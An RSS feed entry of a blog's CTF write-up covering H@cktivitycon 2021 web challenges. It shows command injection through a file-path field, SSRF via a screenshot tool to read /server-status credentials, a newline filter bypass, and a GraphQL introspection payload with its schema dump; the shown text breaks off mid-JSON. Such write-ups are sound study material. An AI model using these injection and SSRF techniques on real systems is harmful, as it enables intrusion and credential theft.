<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Ef&#39;s log</title>
    <link>https://fahmifj.github.io/</link>
    <description>Recent content on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sat, 09 Oct 2021 13:39:22 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>H@cktivitycon 2021 CTF - Web</title>
      <link>https://fahmifj.github.io/ctf/hacktivitycon-2021-web/</link>
      <pubDate>Sat, 09 Oct 2021 13:39:22 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/ctf/hacktivitycon-2021-web/</guid>
      <description>Another late writeups for H@cktivitycon 2021 web category.</description>
      <content:encoded><![CDATA[<p>A continuation of the H@cktivitycon 2021 CTF writeups, but this one is dedicated to the web category I solved.</p>
<h2 id="easy">Easy</h2>
<h3 id="swaggy">Swaggy</h3>
<h4 id="description">Description</h4>
<blockquote>
<p>This API documentation has all the swag</p>
</blockquote>
<h4 id="walkthrough">Walkthrough</h4>
<p>Swaggy is the easiest one, it hosts an instance of <a href="https://swagger.io/tools/swagger-ui/">Swagger UI</a>. There are two API endpoint servers: <code>api.congon4tor.com/v1</code> (production, not available) and <code>staging-api.congon4tor.com:7777</code> (staging). To get the flag, I have to send a HTTP GET request to <code>staging-api.congon4tor.com:7777/flag</code>, but without the correct credentials, it won&rsquo;t give you the flag.</p>
<p><div class="img-container"><img src="imgs/image-20210917154230629.png" alt="image-20210917154230629"  /></div>
</p>
<p>The words &ldquo;staging&rdquo; and &ldquo;testing&rdquo; are the clues for this challenge. Some devs out there typically use common credentials for easy auth, and in this case <code>admin:admin</code> are used.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@ubuntu:~$ <span class="nb">echo</span> -n <span class="s1">&#39;admin:admin&#39;</span> <span class="p">|</span> base64                                               
<span class="nv">YWRtaW46YWRtaW4</span><span class="o">=</span>
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210917154250166.png" alt="image-20210917154250166"  /></div>
</p>
<h3 id="confidentiality">Confidentiality</h3>
<h4 id="description-1">Description</h4>
<blockquote>
<p>My school was trying to teach people about the CIA triad so they made  all these dumb example applications&hellip; as if they know anything about  information security. Can you prove these aren&rsquo;t so secure?</p>
</blockquote>
<h4 id="walkthrough-1">Walkthrough</h4>
<p>The challenge provides a simple website which allows you to list a file permission by inputting the file&rsquo;s path.</p>
<p><div class="img-container"><img src="imgs/image-20210917152231603.png" alt="image-20210917152231603"  /></div>
</p>
<p>If the file does not exist, it spits out an error message which reveals the command used was something like <code>ls -l [path-to-file]</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210917152250416.png" alt="image-20210917152250416"  /></div>
</p>
<p>Now I know that it passes my submitted input (as arguments) to OS commands, therefore I can try to submit a command separator like <code>;</code>, <code>|</code> or some logical operation like <code>||</code> or <code>&amp;&amp;</code>.</p>
<p>It turned out <code>;</code> worked.</p>
<p><div class="img-container"><img src="imgs/image-20210917152339216.png" alt="image-20210917152339216"  /></div>
</p>
<p>And I can just grab the flag.</p>
<p><div class="img-container"><img src="imgs/image-20210917152358697.png" alt="image-20210917152358697"  /></div>
</p>
<h3 id="titanic">Titanic</h3>
<h4 id="description-2">Description</h4>
<blockquote>
<p>Tee-Tech is a rising cyber security organization which creates tools and provide cyber security solution to it&rsquo;s clients, but are they themself secure enough?</p>
</blockquote>
<h4 id="walkthrough-2">Walkthrough</h4>
<p>This challenge hosts a website for a company called Tee-Tech.</p>
<p><div class="img-container"><img src="imgs/image-20210918175527330.png" alt="image-20210918175527330"  /></div>
</p>
<p>The <code>admin</code> menu points to <code>/admin.php</code>, where a login form is shown. I tried several common credentials and SQLi but no luck.</p>
<p><div class="img-container"><img src="imgs/image-20210918175618452.png" alt="image-20210918175618452"  /></div>
</p>
<p>On the page source, I noticed a commented menu (anchor tag) to <code>/server-status</code>. When I visited it directly from a browser, the page returned a forbidden error (If I&rsquo;m not mistaken).</p>
<p><div class="img-container"><img src="imgs/image-20210918181859427.png" alt="image-20210918181859427"  /></div>
</p>
<p>In the next section of the main site, there is a tool offered by this company.</p>
<p><div class="img-container"><img src="imgs/image-20210918175548838.png" alt="image-20210918175548838"  /></div>
</p>
<p>The tool could be used to take a screenshot of a given website URL, so it&rsquo;s SSRF. The captured site image can be viewed at <code>/captures/captured.png</code></p>
<p><div class="img-container"><img src="imgs/image-20210918175635276.png" alt="image-20210918175635276"  /></div>
</p>
<p>When I submitted <code>http://127.0.0.1/</code>, it returned with the following image, which I assume is basically the loading animation of the main site.</p>
<p><div class="img-container"><img src="imgs/image-20210918175721424.png" alt="image-20210918175721424"  /></div>
</p>
<p>If I use the URL capturer to let it visit <code>http://127.0.0.1/server-status</code>, it captures the following contents:</p>
<p><div class="img-container"><img src="imgs/image-20210918182150035.png" alt="image-20210918182150035"  /></div>
</p>
<p>It looked like a kind of web server log, and it contained a set of credentials!</p>
<p>And if I submit that creds, <code>root:EYNDR4NhadwX9rtef</code>, on the admin page, it gives me the flag.</p>
<p><div class="img-container"><img src="imgs/image-20210918183140505.png" alt="image-20210918183140505"  /></div>
</p>
<h2 id="medium">Medium</h2>
<h3 id="integrity">Integrity</h3>
<h4 id="description-3">Description</h4>
<blockquote>
<p>My school was trying to teach people about the CIA triad so they made all these dumb example applications&hellip; as if they know anything about  information security.</p>
<p>Supposedly they learned their lesson and tried to make this one more secure. Can you prove it is still vulnerable?</p>
</blockquote>
<h4 id="walkthrough-3">Walkthrough</h4>
<p>This challenge provides the same UI as Confidentiality, but the functionality is changed. The same trick didn&rsquo;t work here.</p>
<p><div class="img-container"><img src="imgs/image-20210917154503521.png" alt="image-20210917154503521"  /></div>
</p>
<p>I tried several characters for command injection, and the following were found to be filtered.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">% | \ &#34; &#39; { } ` $ ( ) &amp; _ 
</code></pre></div><p>The next thing  I tried was CRLF injection, and it did work with LF (<code>\n</code>).</p>
<p><div class="img-container"><img src="imgs/image-20210917034219286.png" alt="image-20210917034219286.png"  /></div>
</p>
<p>I can just grab the flag.</p>
<p><div class="img-container"><img src="imgs/image-20210917034235319.png" alt="image-20210917034235319"  /></div>
</p>
<h3 id="all-baked-up">All Baked Up</h3>
<p>The walkthrough for this challenge is going to be a bit longer (I might consider separating this) because this is my first encounter with GraphQL, and it was fun ðŸ˜….</p>
<h4 id="description-4">Description</h4>
<blockquote>
<p>Grandma always knew how to make tried-and-true baked goods, and these recipes prove it!</p>
</blockquote>
<h4 id="initial-analysis">Initial analysis</h4>
<p>This challenges hosts a kind of blog about cake.</p>
<p><div class="img-container"><img src="imgs/image-20210917202740803.png" alt="image-20210917202740803"  /></div>
</p>
<p>When observing the network traffic, I see a POST request to GraphQL endpoint.</p>
<p><div class="img-container"><img src="imgs/image-20210917202816500.png" alt="image-20210917202816500"  /></div>
</p>
<p>To investigate it more, I started Burp Suite and then intercepted a POST request to GraphQL for a single post.</p>
<h4 id="graphql">GraphQL</h4>
<p>For a single request, the body contains the following data.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
   <span class="nt">&#34;operationName&#34;</span><span class="p">:</span><span class="s2">&#34;UserQuery&#34;</span><span class="p">,</span>
   <span class="nt">&#34;variables&#34;</span><span class="p">:{</span>
      <span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Strawberry Cake&#34;</span>
   <span class="p">},</span>
   <span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query UserQuery($name: String!) { post(name: $name) { id    name image  content author { username __typename } __typename }  }&#34;</span>
<span class="p">}</span>
</code></pre></div><p>And the returned response is something like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
   <span class="nt">&#34;data&#34;</span><span class="p">:{</span>
      <span class="nt">&#34;post&#34;</span><span class="p">:[</span>
         <span class="p">{</span>
            <span class="nt">&#34;__typename&#34;</span><span class="p">:</span><span class="s2">&#34;Post&#34;</span><span class="p">,</span>
            <span class="nt">&#34;author&#34;</span><span class="p">:{</span>
               <span class="nt">&#34;__typename&#34;</span><span class="p">:</span><span class="s2">&#34;User&#34;</span><span class="p">,</span>
               <span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;congon4tor&#34;</span>
            <span class="p">},</span>
            <span class="nt">&#34;content&#34;</span><span class="p">:</span><span class="s2">&#34;1. Preheat oven to 350Â°. Line the bottoms of 2 greased 8-in. round baking pans with parchment; grease parchment.\n2. In a large bowl, combine cake mix, gelatin, sugar and flour. Add water, oil and eggs; beat on low speed 30 seconds. Beat on medium 2 minutes. Fold in chopped strawberries. Transfer to prepared pans.\n3. Bake until a toothpick inserted in center comes out clean, 25-30 minutes. Cool in pans 10 minutes before removing to wire racks; remove paper. Cool completely.\n4. For frosting, in a small bowl, beat butter until creamy. Beat in crushed strawberries. Gradually beat in enough confectionersâ€™ sugar to reach desired consistency. Spread frosting between layers and over top and sides of cake.&#34;</span><span class="p">,</span>
            <span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span>
            <span class="nt">&#34;image&#34;</span><span class="p">:</span><span class="s2">&#34;https://www.tasteofhome.com/wp-content/uploads/2018/01/Mamaw-Emily-s-Strawberry-Cake_EXPS_FRBZ19_82745_C01_31_4b-9.jpg?resize=696,696&#34;</span><span class="p">,</span>
            <span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Strawberry Cake&#34;</span>
         <span class="p">}</span>
      <span class="p">]</span>
   <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>I found out that the request data can actually be shortened into something like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
   <span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name: \&#34;Strawberry Cake\&#34;) { id    name image  content author { username __typename } __typename }  }&#34;</span>
<span class="p">}</span>

<span class="err">#</span> <span class="err">or</span> <span class="err">just</span>
<span class="p">{</span>
   <span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;{ post(name: \&#34;Strawberry Cake\&#34;) { id    name image  content author { username __typename } __typename }  }&#34;</span>
<span class="p">}</span>
</code></pre></div><p>The first thing I tried was querying the DB schema using the following query from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection">PayloadAllTheThings</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}}&#34;</span><span class="p">}</span>
</code></pre></div><p>The server responded with</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;__schema&#34;</span><span class="p">:{</span><span class="nt">&#34;directives&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Included when true.&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;if&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Directs the executor to include this field or fragment only when the `if` argument is true.&#34;</span><span class="p">,</span><span class="nt">&#34;locations&#34;</span><span class="p">:[</span><span class="s2">&#34;FIELD&#34;</span><span class="p">,</span><span class="s2">&#34;FRAGMENT_SPREAD&#34;</span><span class="p">,</span><span class="s2">&#34;INLINE_FRAGMENT&#34;</span><span class="p">],</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;include&#34;</span><span class="p">},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Skipped when true.&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;if&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Directs the executor to skip this field or fragment when the `if` argument is true.&#34;</span><span class="p">,</span><span class="nt">&#34;locations&#34;</span><span class="p">:[</span><span class="s2">&#34;FIELD&#34;</span><span class="p">,</span><span class="s2">&#34;FRAGMENT_SPREAD&#34;</span><span class="p">,</span><span class="s2">&#34;INLINE_FRAGMENT&#34;</span><span class="p">],</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;skip&#34;</span><span class="p">},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="s2">&#34;\&#34;No longer supported\&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Explains why this element was deprecated, usually also including a suggestion for how to access supported similar data. Formattedin [Markdown](https://daringfireball.net/projects/markdown/).&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;reason&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}],</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Marks an element of a GraphQL schema as no longer supported.&#34;</span><span class="p">,</span><span class="nt">&#34;locations&#34;</span><span class="p">:[</span><span class="s2">&#34;FIELD_DEFINITION&#34;</span><span class="p">,</span><span class="s2">&#34;ENUM_VALUE&#34;</span><span class="p">],</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;deprecated&#34;</span><span class="p">}],</span><span class="nt">&#34;mutationType&#34;</span><span class="p">:{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Mutation&#34;</span><span class="p">},</span><span class="nt">&#34;queryType&#34;</span><span class="p">:{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Query&#34;</span><span class="p">},</span><span class="nt">&#34;types&#34;</span><span class="p">:[{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The name of the post&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;post&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Post&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;posts&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Post&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Query&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;password&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;username&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;authenticateUser&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Auth&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;image&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;content&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;createPost&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Post&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;username&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;defaultValue&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;password&#34;</span><span class="p">,</span><span 